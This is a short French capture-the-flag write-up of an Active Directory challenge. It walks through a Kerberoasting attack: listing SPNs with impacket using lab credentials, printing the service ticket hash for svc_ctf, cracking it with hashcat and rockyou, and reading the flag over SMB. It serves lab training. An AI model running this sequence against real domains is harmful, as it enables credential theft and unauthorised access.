Chall 2 AD :

Le nom du chall SPN grilled : on comprend tout de suite qu'il va s'agir d'une attaque kerberos " kerberoasting " 
SPN = service principal Name


donc la on liste via impacket ( utilitaire très utilisé sur les attaques AD en python ) 

```impacket-GetUserSPNs mh.local/j.peuplu:6fhQ6B8Fg -dc-ip 192.168.1.1 -request 


Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------- -------- -------------------------- --------- ---------- 

CTFSERVER/ctfserver.mh.local svc_ctf 2026-01-20 13:44:16.899938 <never> [-] CCache file is not found. Skipping... $krb5tgs$23$*svc_ctf$MH.LOCAL$mh.local/svc_ctf*$e379df15702bd8324d1fa7b5777109fb$ef42ad9414f013484382b87d67b962c4695d1c4ac5c869f0d5b510754c47c0d10941f08442679808acf37863cffeff01aa97ade4c162691a9c860541f5916c16a70f4d492c45030bcef43b389c261eb362adc1cd865da88387b672874cb71040703a19fbc8dc193d211f7c3143ccbe6d35016eea5f0f2378f304b908686af87dca8c5917fdd6f22545ebffb52115328f51efb2b30e75e4da7eb70320c5ff2e118f0787737368f68033d0a4442a90fecb0fbf038e2aa94e78ed089aa791cbdcc8e1749bb411a64308ecdff1c918b503fd34d0101c6c16830c01d0755776d1eff49501b10e59bf492864b02506496c8cc2d0fc7a3df297d05a9b927edd3ee832bdb77d1038b485a8a3d7cd252b0561c954643fb01fb844ef2acf4b07d56232011d817d4fa29cc48c0028aa87de9aead3e65b22c2894f17b2f8d001bbf7c2a5f2b25a3180971b79b3b74e2c896bf74ea4f6e21dbe9e1731f8967035240fd2199d04d03bce465bba778900de8a7adbba858d820b154c1d580ddd25b6721b2224de7d7b0b7da8bff615e05533bcfa6fa965b7cc5d13e3405030fbe2ce131b86723e843d8b0c7ba3f3e8ce4a31abefb213181f1ed496ac23c9da493828ac33a286a11da65aa6feab9583d87bcd823df1600db02a5395d8477c0612c1aa9692f598bd9e15b3ec61dec7e700554ccb96551f9ca42cb0d6d3d682ae0939563f71fdcfe781d3c0302ffb516069560fb517c2b2593e6d28663684caddefe86278d95327d8c0e50b166433b7cc8063f0d3a2847b072d4ae0dd7a79c02d7585b59cc2799245e08682358a96df646c9ba5a5a76a29cabdad8fb34d45fe5ba3cfc31bee465a044de23b61297c1c899f9f448f0440e8de02ed0115e4abe807dca0e9d70cb30d98ba3dcb7f2a056926773e52f9bded08378d578c06397caa4314c01e718168ac572ce5a0fdfbf9829d8e65ee65794d6d1ef2d4cbf9fc6e4a4097371c4f449bb9efcee5e1b25640378afbf7dd85ab050fe92c78877351dd5b2e76387f0addf2118be91c428807e57a91a48e44ec1cc2c59e065b6d837eaee3dc70038ac28b68126446448269854c8997f56a5fc319def1ab850ae4d6c07c8e8c2aa862561622f1e3aa4d44e56f83ad5be56bf08152257c426c134503bc155171187e3ea51e4c8e577366f8230d94e9e74382c626271f38ca3d40b85a8a392fdfede5b5d545ee9bb668abbf9fa889cf4742dfe4ae585b2aead8f9783bcbee69b1f714eefaa0a905bccf80e681d9616b173c1915fd7daa840d40f86e4a881ec2cee965b7572a0e4cbd0c03ddf4cd74323c69dd06383da8f7fb1160b801489a14fdc421ba7ba293fd16b020d3c766beb40e8bc2e76471f037b39c042f03e23671643d77f2ecb3e187137327206d0b392437db1eb0d526b09be3327d75cd5aafe5f8d4183d6e5c7d2d72dcf9b83d55c44738941679892542200aa27d677db3e36cffa833```


On obtient son HASH

on colle le hash dans un hash.txt

et on lance un bruteforce via rockyou

```hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

hashcat -m 13100 hash.txt --show```

On récupère le password à la fin pour l'utilisateur **svc_ctf**
le mdp est : **cookies**

```smbclient -U svc_ctf //192.168.1.1/FLAGCHALL4```

On tape cookies et on entre sur le serveur 

un simple :

```type flag.txt

fl@g{K3rb3r0@st3d}```


et voila le chall AD2 est fini :slight_smile:
